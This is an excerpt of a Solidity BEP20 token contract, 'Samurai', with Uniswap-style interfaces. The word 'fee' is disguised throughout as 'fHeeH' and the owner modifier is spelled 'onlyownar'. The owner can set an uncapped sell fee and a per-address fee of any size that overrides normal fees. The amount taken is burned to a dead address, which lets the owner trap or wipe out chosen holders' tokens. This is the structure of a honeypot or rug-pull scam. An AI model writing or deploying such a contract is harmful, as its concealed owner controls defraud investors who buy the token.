...
interface IUniswapV2Factory {
    ...
    function fHeeHTo() external view returns (address);
    function fHeeHToSetter() external view returns (address);
    ...
    function setfHeeHTo(address) external;
    function setfHeeHToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfHeeHOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfHeeHOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfHeeHOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfHeeHOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfHeeHOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Samurai is BEP20, Ownable {
    ...
    uint256 private _defaultSellfHeeH = 0;

    uint256 private _defaultBuyfHeeH = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfHeeH;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfHeeH = _value;
    }

    function setSlipfHeeH(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfHeeH[_address] = _value;
    }

    function getSlipfHeeH(address _address) external view onlyownar returns (uint256) {
        return _slipfHeeH[_address];
    }


    function setMAccountfHeeH(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfHeeH(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefHeeHAmount = 0;

        if (rF) {
            uint256 tradefHeeH = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefHeeH = _defaultSellfHeeH;
                }
                if (from == uniswapV2Pair) {

                    tradefHeeH = _defaultBuyfHeeH;
                }
            }
            if (_slipfHeeH[from] > 0) {
                tradefHeeH = _slipfHeeH[from];
            }

            tradefHeeHAmount = _Amount.mul(tradefHeeH).div(100);
        }


        if (tradefHeeHAmount > 0) {
            _balances[from] = _balances[from].sub(tradefHeeHAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefHeeHAmount);
            emit Transfer(from, _deadAddress, tradefHeeHAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefHeeHAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefHeeHAmount);
        emit Transfer(from, _to, _Amount - tradefHeeHAmount);
    }
